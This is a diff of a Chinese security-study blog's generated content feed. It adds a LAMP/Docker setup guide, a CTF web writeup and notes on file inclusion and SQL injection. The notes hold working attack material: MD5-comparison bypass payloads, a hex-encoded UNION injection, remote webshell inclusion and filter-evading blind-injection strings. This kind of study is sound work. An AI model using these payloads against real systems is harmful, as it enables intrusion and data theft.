+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">http://www.freebuf.com/articles/web/166731.html</div><div class="line">http://www.bendawang.site/2017/09/16/RPO%E4%BA%8C%E4%B8%89%E4%BA%8B/</div><div class="line">http://blog.nsfocus.net/rpo-attack/</div><div class="line">https://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html</div><div class="line">https://www.tuicool.com/articles/eIf6Vje</div><div class="line">https://github.com/eboda/34c3ctf/tree/master/urlstorage</div><div class="line">https://www.secpulse.com/archives/70070.html</div><div class="line">http://www.qingpingshan.com/m/view.php?aid=240597</div></pre></td></tr></table></figure>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Ubuntu下Apache2、Mysql、php7搭建]]></title>
+      <url>/2018/04/23/Ubuntu%E4%B8%8BApache2%E3%80%81Mysql%E3%80%81php7%E6%90%AD%E5%BB%BA/</url>
+      <content type="html"><![CDATA[<p>— LAMP搭建 —<br><a id="more"></a></p>
+<h2 id="Ubuntu-下-LAMP-搭建"><a href="#Ubuntu-下-LAMP-搭建" class="headerlink" title="Ubuntu 下 LAMP 搭建"></a>Ubuntu 下 LAMP 搭建</h2><p>在docker下搭建，利用了官方ubuntu:lastest<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">apt-get update</div><div class="line"><span class="comment">#安装vim net-tools  包括netstat等</span></div><div class="line">apt-get install vim-gtk</div><div class="line">apt-get install net-tools</div><div class="line"><span class="comment">#可以更新源 详情百度</span></div><div class="line">apt-get install mysql-server</div><div class="line">service mysql start</div><div class="line">apt-get install apache2</div><div class="line">service apache2 start</div><div class="line">apt-get install php7.0 php7.0-mcrypt</div><div class="line"></div><div class="line">vim /etc/apache2/sites-available <span class="comment"># 修改网站根目录</span></div></pre></td></tr></table></figure></p>
+<p>删除php7 更换php5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#移除默认已安装的PHP包</span></div><div class="line">apt-get install aptitude</div><div class="line">aptitude purge `dpkg -l | grep php| awk <span class="string">'&#123;print $2&#125;'</span> |tr <span class="string">"\n"</span> <span class="string">" "</span>`</div><div class="line"><span class="comment">#安装切换源的add-apt-repository所依赖的两个包</span></div><div class="line">apt-get install python-software-properties</div><div class="line">apt-get install software-properties-common</div><div class="line">apt-get update</div><div class="line"><span class="comment">##更新得到PPA源</span></div><div class="line">add-apt-repository ppa:ondrej/phpe</div><div class="line"><span class="comment">##出错WARNING: could not open file '/etc/apt/sources.list'</span></div><div class="line">之前改过sources.list</div><div class="line">把原来的sources.list 替换回去 就可以</div><div class="line"><span class="comment">##出错WARNING: add-apt-repository is broken with non-UTF-8 locales</span></div><div class="line">根据提示内容修改命令</div><div class="line">LC_ALL=C.UTF-8 add-apt-repository ppa:ondrej/php</div><div class="line">apt-get update</div><div class="line"><span class="comment">##安装php对应版本</span></div><div class="line">apt-get install php5.6</div><div class="line">apt-get install php5.6-gd</div><div class="line">apt-get install php5.6-mysql </div><div class="line"><span class="comment">##网速极慢...</span></div></pre></td></tr></table></figure></p>
+<h2 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h2><p>当需要各种版本的php<br>事情的最后，你会发现还是phpstudy好用<br>安装：<a href="http://www.phpstudy.net/download.html" target="_blank" rel="external">phpstudy_linux</a><br>使用：<br>apache配置文件：/phpstudy/server/httpd/conf/httpd.conf<br>PHP配置文件：/phpstudy/server/php/etc/php.ini<br>打开MySQL控制台：/phpstudy/mysql/bin/mysql -uroot -proot<br>网站根目录 /phpstudy/www</p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> linux </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Docker使用]]></title>
       <url>/2018/04/21/docker/</url>
-      <content type="html"><![CDATA[<p>— docker安装使用 —<br>— docker下LAMP搭建 —<br>— linoda/lamp使用 —<br><a id="more"></a><br>出题需要….入坑….翻滚….翻滚…..坑中来回翻滚…</p>
+      <content type="html"><![CDATA[<p>— docker安装使用 —<br>— linoda/lamp使用 —<br><a id="more"></a><br>出题需要….入坑….翻滚….翻滚…..坑中来回翻滚…</p>
 <h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><p><a href="https://blog.csdn.net/u013814153/article/details/53925790" target="_blank" rel="external">kali下安装docker</a><br><a href="https://docs.docker-cn.com" target="_blank" rel="external">官方文档</a>(需要翻墙)</p>
 <h2 id="Docker层次"><a href="#Docker层次" class="headerlink" title="Docker层次"></a>Docker层次</h2><p>仓库（Repository）—— 镜像（Image）—— 容器（Container）<br>仓库在云端，有官方有个人的很多很多镜像<br>镜像运行成为容器<br>先弄一个自己的仓库吧，可以传上去传下来<br>申请一个Docker账号，就可以有自己的仓库（虽然事后证明，因为网速问题，并不可以传上去传下来）</p>
 <h2 id="Docker账号与代理"><a href="#Docker账号与代理" class="headerlink" title="Docker账号与代理"></a>Docker账号与代理</h2><p><a href="https://cloud.docker.com/" target="_blank" rel="external">申请docker账号</a>(不翻墙很慢)<br><a href="https://www.cnblogs.com/anliven/p/6218741.html" target="_blank" rel="external">代理加速</a>(文章其中的docker login的账号密码应该docker的账号和密码)</p>
@@ -24,9 +285,8 @@
 <li>-d:容器在后台运行</li>
 <li>-t:启动后进入命令行</li>
 <li>-p:端口映射</li>
-<li>-v：挂载文件，可以在外面操作里面的文件</li>
+<li>-v：挂载文件，可以在外面操作里面的文件<br>此外：<br>后面一般跟一个<code>/bash/bin</code>这是表示载入容器后运行bash。<br>docker中必须要保持一个进程的运行，要不然整个容器就会退出。<br>有的镜像 不跟就会直接退出<h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3>端口映射：使用<code>-p</code>参数会分配宿主机的端口映射到虚拟机<br><code>docker run -p ip:hostPort:containerPort</code><br>ip：宿主机的ip地址<br>hostPort：宿主机需要映射的端口<br>containerPort：虚拟机的端口</li>
 </ul>
-<h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p>端口映射：使用<code>-p</code>参数会分配宿主机的端口映射到虚拟机<br><code>docker run -p ip:hostPort:containerPort</code><br>ip：宿主机的ip地址<br>hostPort：宿主机需要映射的端口<br>containerPort：虚拟机的端口</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -p 127.0.0.1:3306:3306，映射本机的3306端口到虚拟机的3306端口。</div></pre></td></tr></table></figure>
 <h3 id="检查端口"><a href="#检查端口" class="headerlink" title="检查端口"></a>检查端口</h3><p><code>docker port cortainerid</code>：查看容器端口映射情况</p>
 <h2 id="Docker-容器文件-lt-–-gt-容器–-gt-镜像-仓库"><a href="#Docker-容器文件-lt-–-gt-容器–-gt-镜像-仓库" class="headerlink" title="Docker 容器文件&lt;–&gt;容器–&gt;镜像/仓库"></a>Docker 容器文件&lt;–&gt;容器–&gt;镜像/仓库</h2><p><code>docker commit [参数] 容器ID [用户/仓库：标签]</code>：把容器固化成镜像<br>参数：</p>
@@ -34,7 +294,7 @@
 <li>-m 说明 </li>
 <li>-a 作者信息<br><code>docker import -m &quot;message&quot; file|URL 名称</code>：从文件读入<br><code>docker export -m &quot;message&quot; file|URL 名称</code>：读出到文件</li>
 </ul>
-<h2 id="Docker容器-操作"><a href="#Docker容器-操作" class="headerlink" title="Docker容器 操作"></a>Docker容器 操作</h2><p><code>docker ps</code>:查看运行中的container</p>
+<h2 id="Docker容器-操作"><a href="#Docker容器-操作" class="headerlink" title="Docker容器 操作"></a>Docker容器 操作</h2><p><code>docker exec -i -t CONTAINER ID /bin/bash</code><br>跟docker run有一点类似<br><code>docker ps</code>:查看运行中的container</p>
 <ul>
 <li>-a：查看所有容器包括停止状态的容器</li>
 </ul>
@@ -68,9 +328,6 @@
 <p>每个Dockerfile只能有一条CMD命令。如果指定了多条命令，只有最后一条会被执行。</p>
 <p><strong>EXPOSE 声明端口监听</strong><br>格式：<code>EXPOSE &lt;POST&gt;</code><br>只起到声明的作用，不会自动完成端口映射。还是需要docker run -p来指定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXPOSE 22 80 443 3306 ##这些端口需要监听，即映射到外部</div></pre></td></tr></table></figure></p>
 <p><a href="https://www.cnblogs.com/fengzheng/p/5181222.html" target="_blank" rel="external">其他Dockerfile命令</a></p>
-<h2 id="DOCKER下-LAMP-搭建"><a href="#DOCKER下-LAMP-搭建" class="headerlink" title="DOCKER下 LAMP 搭建"></a>DOCKER下 LAMP 搭建</h2><p>利用了官方ubuntu<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">apt-get update</div><div class="line">apt-get install vim-gtk</div><div class="line">apt-get install net-tools</div><div class="line"><span class="comment">#可以更新源</span></div><div class="line">apt-get install mysql-server</div><div class="line">service mysql start</div><div class="line">apt-get install apache2</div><div class="line">service apache2 start</div><div class="line">apt-get install php7.0 php7.0-mcrypt</div><div class="line"></div><div class="line">vim /etc/apache2/sites-available <span class="comment"># 修改网站根目录</span></div></pre></td></tr></table></figure></p>
-<p>发现装错了。。。应该php5.5<br>删除php7 更换php5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#移除默认已安装的PHP包</span></div><div class="line">apt-get install aptitude</div><div class="line">aptitude purge `dpkg -l | grep php| awk <span class="string">'&#123;print $2&#125;'</span> |tr <span class="string">"\n"</span> <span class="string">" "</span>`</div><div class="line"><span class="comment">#安装切换源的add-apt-repository所依赖的两个包</span></div><div class="line">apt-get install python-software-properties</div><div class="line">apt-get install software-properties-common</div><div class="line">apt-get update</div><div class="line"><span class="comment">##更新得到PPA源</span></div><div class="line">add-apt-repository ppa:ondrej/phpe</div><div class="line"><span class="comment">##出错WARNING: could not open file '/etc/apt/sources.list'</span></div><div class="line">之前改过sources.list</div><div class="line">把原来的sources.list 替换回去 就可以</div><div class="line"><span class="comment">##出错WARNING: add-apt-repository is broken with non-UTF-8 locales</span></div><div class="line">根据提示内容修改命令</div><div class="line">LC_ALL=C.UTF-8 add-apt-repository ppa:ondrej/php</div><div class="line">apt-get update</div><div class="line"><span class="comment">##安装php对应版本</span></div><div class="line">apt-get install php5.6</div><div class="line">apt-get install php5.6-gd</div><div class="line">apt-get install php5.6-mysql</div></pre></td></tr></table></figure></p>
-<p>…..好了 下载速度贼慢，疯狂断<br>再换…</p>
 <h2 id="docker下利用linoda-lamp"><a href="#docker下利用linoda-lamp" class="headerlink" title="docker下利用linoda/lamp"></a>docker下利用linoda/lamp</h2><p><a href="https://hub.docker.com/r/linode/lamp/" target="_blank" rel="external">官方文档</a><br><a href="https://blog.csdn.net/MasonQAQ/article/details/78048112?locationNum=5&amp;fps=1" target="_blank" rel="external">网上教程</a></p>
 <h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p><code>service mysql start</code><br><code>mysql -u root -p</code><br><code>Admin2015</code></p>
 <h3 id="apache2-配置文件"><a href="#apache2-配置文件" class="headerlink" title="apache2 配置文件"></a>apache2 配置文件</h3><p><code>/etc/apache2/apache2.conf</code>:apache2启动时自动读取文件<br><code>/etc/apache2/sites-enabled</code>：指向sites-available文件的符号链接<br><code>/etc/apache2/sites-available</code>：真正配置文件所在</p>
@@ -82,7 +339,7 @@
         
         <tags>
             
-            <tag> web </tag>
+            <tag> tools </tag>
             
         </tags>
         
@@ -229,6 +486,66 @@
     </entry>
     
     <entry>
+      <title><![CDATA[WEB-网强杯-WEB-writeup]]></title>
+      <url>/2018/03/26/WEB-%E7%BD%91%E5%BC%BA%E6%9D%AF%20WEB%20writeup/</url>
+      <content type="html"><![CDATA[<p>— 第二届网强杯 —<br><a id="more"></a></p>
+<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p>可以叫做<strong>md5 Three hit</strong><br>右键源码</p>
+<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!=$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>]) == md5($_POST[<span class="string">'param2'</span>])</div><div class="line">    <span class="keyword">die</span>(<span class="string">"success!"</span>);</div></pre></td></tr></table></figure>
+<p><code>==</code> php特性：可以不完全相等，0e123=0e456<br>param1=QNKCDZO  param2=s878926199a</p>
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>]) === md5($_POST[<span class="string">'param2'</span>])</div><div class="line">    <span class="keyword">die</span>(<span class="string">"success!"</span>);</div></pre></td></tr></table></figure>
+<p><code>===</code> 精准匹配。<br>利用<code>md5()</code>漏洞，数组传入返回null，使 null===null<br>param1[]=1  param2[]=2</p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>((string)$_POST[<span class="string">'param1'</span>]!==(string)$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>]) === md5($_POST[<span class="string">'param2'</span>])</div><div class="line">    <span class="keyword">die</span>(<span class="string">"success!"</span>);</div></pre></td></tr></table></figure>
+<p>无论输入什么都会变成字符串。没法绕过。<br>利用<a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="external">hash碰撞</a>生成2进制文件,使用burpsuite或者python-requests读取文件发送<br>burpsuite就不细说了，python脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">fp1=open(<span class="string">"msg1.bin"</span>)</div><div class="line">fp2=open(<span class="string">"msg2.bin"</span>)</div><div class="line">url=<span class="string">"http://39.107.33.96:10000/"</span></div><div class="line">data=&#123;<span class="string">'param1'</span>:fp1.read(),<span class="string">'param2'</span>:fp2.read()&#125;</div><div class="line">cookie=&#123;<span class="string">'PHPSESSID'</span>: <span class="string">'0n7qa29j2kvas7n402idu87aj1'</span>&#125;</div><div class="line">r=requests.post(url,data=data,cookies=cookie)</div><div class="line"><span class="keyword">print</span> r.text</div></pre></td></tr></table></figure></p>
+<h2 id="Three-hit"><a href="#Three-hit" class="headerlink" title="Three hit"></a>Three hit</h2><p>开始<code>index.php</code>页面，有登录(?func=login)和注册(?func=register)两个功能<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpq97quaj4j30ez0ckaa7.jpg" alt="111.png"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpq97uxoc7j30d30gfaa4.jpg" alt="222.png"><br>输入有过滤</p>
+<ul>
+<li>账号需要是 0-9a-zA-Z</li>
+<li>年龄需要是数字</li>
+<li>密码没有过滤</li>
+</ul>
+<p>注册后登录，进入 <code>profile.php</code><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpq97zr4w8j30k3085whd.jpg" alt="333.png"><br>跑目录，找到一个<strong>config.php</strong>，但没有内容<br>抓包查看，其中login页面有回显，估计是数据库查询内容回显，其他页面正常<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpq983ffhtj30b508eweo.jpg" alt="444.png"><br>思索…..</p>
+<ul>
+<li>php中判断是数字可能用到<code>is_numeric()</code>，is_numeric判断数字不严格，可以是16进制。</li>
+<li>猜测后端数据库语句是<br><code>insert into lesson1(name,age,password) values(name,age,password)</code><br>在insert语句中，16进制插入会解析成字符，存入数据库中</li>
+</ul>
+<p>以上两点结合在一起<br>可以通过age输入payload转成16进制，通过insert注入数据库中，再通过login的回显判断是否成功<br>再通过页面逻辑，判断<code>profile.php</code>中的数据库语句是<br><code>select * from 表 where age = (我们的age)</code></p>
+<p>构造payload测试(因为回显判断4列)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">age=1 and 0 union select 1,2,3,4 #</div><div class="line">age=0x3120616e64203020756e696f6e2073656c65637420312c322c332c342023</div></pre></td></tr></table></figure></p>
+<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpq987soqwj30bg08e3yr.jpg" alt="555.png"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpq98az6sij30l50b8q7t.jpg" alt="666.png"><br>成功<br>之后省略注入过程<br>得到<strong>user()</strong>,<strong>database()</strong>,尝试<strong>information_schema</strong>可行，得到表结构</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">库</th>
+<th style="text-align:center">表</th>
+<th style="text-align:center">列</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">qwb</td>
+<td style="text-align:center">users</td>
+<td style="text-align:center">id username age password</td>
+</tr>
+<tr>
+<td style="text-align:center">qwb</td>
+<td style="text-align:center">flag</td>
+<td style="text-align:center">flag</td>
+</tr>
+</tbody>
+</table>
+<p>读取flag</p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[WEB-LFI与RFI利用]]></title>
       <url>/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/</url>
       <content type="html"><![CDATA[<p>— 从零开始的笔记(长篇) —<br>— 本地文件包含&amp;远程文件包含 —<br>— PHP伪协议利用&amp;文件上传漏洞 —<br><a id="more"></a><br>emmm，从最开始的定义开始吧。</p>
@@ -343,6 +660,7 @@ c:/windows/temp/(PHP Sessions)等文件中。
 <p>那么开始说明应用</p>
 <blockquote>
 <p>开始前，补充。<br>php中<strong>fopen函数</strong>与<strong>include函数</strong>区别：<br>fopen与include打开/包含远程文件时，对方服务器都会先解析文件然后被本地php代码 打开/包含。<br>区别是：<br>fopen是直接读取这个文件，当做一个输入流，不会在本地做解析。include会包含进入代码内，再解析执行一次。<br>所以include包含的文件里有木马时，可以执行。fopen打开一个包含木马的文件，不会有什么大危害，因为只是作为文本文件。</p>
+<p>再补充<strong>本地文件包含</strong>与<strong>远程文件包含</strong>的区别:<br>include ./shell.php;<br>include <a href="http://localhost/shell.php" target="_blank" rel="external">http://localhost/shell.php</a><br>以上两者有区别，前者为<strong>本地文件包含</strong>：如果shell.php文件中存在<code>&lt;?php 木马 ?&gt;</code>，木马会执行。但如果shell.php 中的木马是在php代码执行一遍过后，才产生的，是不会执行的。<br>即需要解析一遍shell.php页面，才产生木马。比如从数据库中读取了带木马的信息，嵌入到页面上。<br>而后者<strong>远程文件包含</strong>是前后者情况都会执行的：前者情况，会在远程访问shell.php的请求中执行。后者情况，会在远程访问结束后，把包含木马的返回内容include，再次执行。<br>即，本地文件包含本地文件 总共会解析一次，远程文件包含本地文件 总共会解析两次。</p>
 </blockquote>
 <p>以下测试是在php5.2中完成。</p>
 <h3 id="当allow-url-fopen和allow-url-include都为On时"><a href="#当allow-url-fopen和allow-url-include都为On时" class="headerlink" title="当allow_url_fopen和allow_url_include都为On时"></a>当<em>allow_url_fopen</em>和<em>allow_url_include</em>都为On时</h3><p>可以进行远程文件包含执行，即可以包含在自己服务器的木马，形成web-shell。<br>也可以使用wget之类的命令来下载木马，保存，再访问木马文件</p>
@@ -460,7 +778,7 @@ c:/windows/temp/(PHP Sessions)等文件中。
 </blockquote>
 <p><strong>作用</strong>：设置为On时，可以直接包含远程文件(http:// 与ftp:// )，比如include包含。<code>include($var)</code> 当$var可控时，可以执行PHP代码<br>讲<strong>allow_url_include</strong>的同时就会提到<strong>allow_url_fopen</strong>。因为在官方文档中使用<em>allow_url_include</em>的前提是<em>allow_url_fopen</em>为On</p>
 <h3 id="allow-url-fopen-是否允许打开远程文件"><a href="#allow-url-fopen-是否允许打开远程文件" class="headerlink" title="allow_url_fopen(是否允许打开远程文件)"></a>allow_url_fopen(是否允许打开远程文件)</h3><p>在 PHP &lt;= 4.3.4 时是 PHP_INI_ALL。之后版本是 PHP_INI_SYSTEM,默认为On<br><strong>作用</strong>：设置为On时，允许打开远程文件，比如fopen打开。</p>
-<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>其实这两个选项形成的就是<strong>远程文件包含漏洞RFI</strong><br>查看另一篇博客吧<a href="">戳这里</a> </p>
+<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>其实这两个选项形成的就是<strong>远程文件包含漏洞RFI</strong><br>查看另一篇博客吧<a href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/" target="_blank" rel="external">戳这里</a> </p>
 <h2 id="magic-quotes-gpc-魔术引号自动过滤"><a href="#magic-quotes-gpc-魔术引号自动过滤" class="headerlink" title="magic_quotes_gpc(魔术引号自动过滤)"></a>magic_quotes_gpc(魔术引号自动过滤)</h2><p>在 PHP &lt;= 4.2.3 时是 <strong>PHP_INI_ALL</strong>，之后是 <strong>PHP_INI_PERDIR</strong>， 默认为On。<br>从 PHP 5.3.0 起不推荐使用。 在 PHP 5.4.0 中移除该选项。（避免了magic_quotes_gpc未设置，用户依赖这个设置而带来了安全隐患）<br><strong>作用</strong>：为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。当 magic_quotes 为 on，自动在单引号(‘)、双引号(“)、反斜杠()及空字符(NULL)前面加上反斜杠()。不会过滤<strong>$_SERVER</strong>变量，可以利用client-ip、referer一类的漏洞。<br>如果 magic_quotes_sybase 也是 ON，它会完全覆盖 magic_quotes_gpc</p>
 <h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>以下测试是在php5.2中完成。<br>magic_quotes_gpc 为 On<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">print_r($_GET);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
 <div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpb90lzewyj30go040glk.jpg" alt="10.png"><br></div>
@@ -1077,6 +1395,8 @@ Content-Type: text/xml
             
             <tag> 比特币 </tag>
             
+            <tag> 区块链 </tag>
+            
         </tags>
         
     </entry>
@@ -1101,7 +1421,7 @@ Content-Type: text/xml
 <ul>
 <li><em>共识机制</em>使之在分布式系统中保证数据一致性的算法;</li>
 <li><em>去中心化</em>是指参与区块链的所有节点都是权利对等的，没有高低之分，唯一的限制就是个人自己的选择。</li>
-<li><em>公开数据库</em>则意味着所有人都可以看到国王的区块和交易，这也保证了无法造价和改写。</li>
+<li><em>公开数据库</em>则意味着所有人都可以看到过往的区块和交易，这也保证了无法造价和改写。</li>
 </ul>
 <p><strong>Block Chain(区块链)</strong>：比特币从开始到现在的每一笔产出或交易的记录文件。<a href="https://link.zhihu.com/?target=http%3A//blockchain.info/" target="_blank" rel="external">Bitcoin Block Explorer</a>可以查看<br><strong>Block(数据区块)</strong>：一个区块是部分或所有最新(未被其他先前的区块记录)比特币交易的记录集。大约10min产生一个。</p>
 <p>以下给出比特币系统中的区块结构，在之后会有说明<br>数据区块结构：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fmgi0r6p5hj30n707nt99.jpg" alt="数据区块结构"><br>区块头结构：<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fmgi07kgwoj30n40b6t9u.jpg" alt="区块头结构"></p>
@@ -1158,6 +1478,8 @@ Content-Type: text/xml
             
             <tag> 比特币 </tag>
             
+            <tag> 区块链 </tag>
+            
         </tags>
         
     </entry>
@@ -1213,14 +1535,18 @@ Content-Type: text/xml
 <h3 id="大小写混用"><a href="#大小写混用" class="headerlink" title="大小写混用"></a>大小写混用</h3><p>SeLeT   不多解释</p>
 <h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><ul>
 <li>两个空格代替一个空格，TAB代替空格</li>
-<li>用注释符号代替空格 /**/</li>
-<li>用括号代替空格 </li>
+<li>用注释符号代替空格 /<em>*/ /</em>.1<em>/ /</em>ddd*/ (ddd为无意义的字母)</li>
+<li>用括号代替空格  ()</li>
 <li>用+代替空格  </li>
-<li><p>%0a %a0 %20</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">2</span>=<span class="number">2</span>;   <span class="comment">---------&gt;   select(user())from dual where(1=1)and(2=2)</span></div><div class="line">利用函数完成猜解  如：  猜解user()第二个字符的ascii码是不是109，若是109，则页面加载将延迟</div><div class="line">	http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109))</div></pre></td></tr></table></figure>
-</li>
-<li><p>select+user()  +代替空格  不是url编码空格的+而是直接的+</p>
-<h3 id="过滤information-schema-tables等关键表名"><a href="#过滤information-schema-tables等关键表名" class="headerlink" title="过滤information_schema.tables等关键表名"></a>过滤information_schema.tables等关键表名</h3></li>
+<li>%0a %a0 %20  %09  %0B %0C %0D </li>
+<li>用花括号代替空格 {}</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#()</div><div class="line"><span class="keyword">select</span>(<span class="number">1</span>)</div><div class="line">#利用函数完成猜解  如：  猜解<span class="keyword">user</span>()第二个字符的<span class="keyword">ascii</span>码是不是<span class="number">109</span>，若是<span class="number">109</span>，则页面加载将延迟</div><div class="line"><span class="keyword">http</span>://www.xxx.com/index.php?<span class="keyword">id</span>=(<span class="keyword">sleep</span>(<span class="keyword">ascii</span>(<span class="keyword">mid</span>(<span class="keyword">user</span>()<span class="keyword">from</span>(<span class="number">2</span>)<span class="keyword">for</span>(<span class="number">1</span>)))=<span class="number">109</span>))</div><div class="line"># <span class="string">' "</span></div><div class="line"><span class="string">select'</span><span class="number">1</span><span class="string">'</span></div><div class="line"><span class="string">select"1"</span></div><div class="line"><span class="string"># &#123;&#125;</span></div><div class="line"><span class="string">select&#123;1&#125;</span></div></pre></td></tr></table></figure>
+<ul>
+<li>+代替空格  不是url编码空格的+而是直接的+ <code>select+user()</code></li>
+<li>单引号双引号代替空格  </li>
+</ul>
+<h3 id="过滤information-schema-tables等关键表名"><a href="#过滤information-schema-tables等关键表名" class="headerlink" title="过滤information_schema.tables等关键表名"></a>过滤information_schema.tables等关键表名</h3><ul>
 <li><code>select table_name from mysql.innodb_table</code> 不清楚何时起作用，起码我的mysql中没有innodb_table这个表</li>
 <li>information_schema . tables<br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqgxvtxg2nj30aq02r3yd.jpg" alt=""></li>
 <li>/<em>!50000information_schema.tables</em>/</li>
@@ -1231,10 +1557,10 @@ Content-Type: text/xml
 <li>需要与零比较：<code>-1 or 1=1 and ord(substr(user(),1,1))-114</code></li>
 <li>substring(flag,1,1)in(‘a’) / substring(flag,1,1)in(0x97)</li>
 </ul>
